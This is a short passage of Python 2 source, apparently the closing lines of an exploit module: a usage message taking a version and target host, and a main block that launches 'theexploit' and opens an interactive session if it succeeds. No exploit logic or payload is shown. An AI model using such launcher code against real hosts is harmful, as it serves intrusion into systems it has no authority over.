        print 'Usage: %s -v version -t host\n'%(sys.argv[0])
        self.displayVersions()

if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
